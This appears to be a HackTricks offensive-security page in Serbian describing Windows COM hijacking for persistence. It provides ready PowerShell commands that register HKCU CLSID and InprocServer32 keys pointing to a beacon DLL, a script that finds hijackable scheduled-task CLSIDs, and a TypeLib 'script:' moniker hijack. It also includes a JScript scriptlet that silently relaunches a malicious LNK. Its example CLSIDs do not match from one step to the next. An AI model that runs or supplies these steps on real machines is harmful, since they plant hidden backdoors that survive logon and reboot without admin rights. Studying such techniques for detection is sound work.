# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Pretraga nepostojećih COM komponenti

Pošto korisnici mogu menjati vrednosti HKCU, **COM Hijacking** može biti iskorišćen kao **mehanizam za perzistenciju**. Koristeći `procmon` lako je pronaći tražene COM registries koje ne postoje, a koje napadač može kreirati da bi ostvario perzistenciju. Filteri:

- **RegOpenKey** operacije.
- gde je _Result_ **NAME NOT FOUND**.
- i da _Path_ završava sa **InprocServer32**.

Kada odlučite koji nepostojeći COM ćete oponašati, izvršite sledeće komande. _Budite pažljivi ako odlučite da oponašate COM koji se učitava svakih nekoliko sekundi, jer to može biti previše._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks koriste Custom Triggers za pozivanje COM objects, i pošto se izvršavaju preko Task Scheduler-a, lakše je predvideti kada će biti pokrenuti.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Proverom izlaza možete izabrati onaj koji će, na primer, biti izvršen **svaki put kada se korisnik prijavi**.

Sada, pretražujući CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** u **HKEY\CLASSES\ROOT\CLSID** i u HKLM i HKCU, obično ćete utvrditi da vrednost ne postoji u HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Zatim možete jednostavno kreirati HKCU unos i svaki put kada se korisnik prijavi, vaš backdoor će biti pokrenut.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definišu COM interfejse i učitavaju se preko `LoadTypeLib()`. Kada se COM server instancira, OS može učitati i pridruženi TypeLib konsultujući registry ključeve pod `HKCR\TypeLib\{LIBID}`. Ako se putanja TypeLib-a zameni sa **moniker**, npr. `script:C:\...\evil.sct`, Windows će izvršiti scriptlet kada se TypeLib razreši — što rezultira stealthy persistence koja se aktivira kada se dodirnu uobičajene komponente.

Ovo je primećeno protiv Microsoft Web Browser control (često učitavan od Internet Explorer, aplikacija koje ugrađuju WebBrowser, pa čak i `explorer.exe`).

### Koraci (PowerShell)

1) Pronađite TypeLib (LIBID) koji koristi CLSID koji se često pojavljuje. Primer CLSID koji malware chains često zloupotrebljavaju: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}`
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Усмерите per-user TypeLib путању на локални scriptlet користећи `script:` moniker (нису потребна администраторска права):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Postavite minimalni JScript `.sct` koji ponovo pokreće vaš primarni payload (npr. `.lnk` koji se koristi u početnom lancu):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Aktiviranje – otvaranjem IE, aplikacije koja ugrađuje WebBrowser control, ili čak rutinskom aktivnošću Explorera učitaće se TypeLib i izvršiće se scriptlet, ponovo naoružavajući vaš lanac prilikom prijave/ponovnog pokretanja.

Čišćenje
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Napomene
- Istu logiku možete primeniti na druge često korišćene COM komponente; uvek prvo odredite stvarni `LIBID` iz `HKCR\CLSID\{CLSID}\TypeLib`.
- Na 64-bitnim sistemima možete takođe popuniti podključ `win64` za 64-bitne aplikacije.

## Reference

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
